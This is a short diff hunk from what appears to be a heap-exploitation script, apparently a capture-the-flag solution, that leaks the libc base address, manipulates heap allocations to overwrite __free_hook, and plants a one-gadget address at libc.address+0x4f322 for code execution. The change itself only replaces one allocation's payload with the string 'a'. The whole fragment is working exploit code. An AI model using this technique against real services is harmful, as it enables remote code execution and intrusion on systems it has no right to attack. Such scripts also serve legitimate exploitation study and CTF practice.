@@ -78,7 +78,7 @@ def main(C):
 	log.info("libc : " + hex(libc.address))
 	delheap(1)
 
-	newheap(0x111-0x20,pl) #1
+	newheap(0x111-0x20,"a") #1
 	newheap(0x20,"A"*0x10+p64(libc.symbols['__free_hook']))
 	newheap(0x100,"A")
 	newheap(0x100,p64(libc.address+0x4f322)) #5
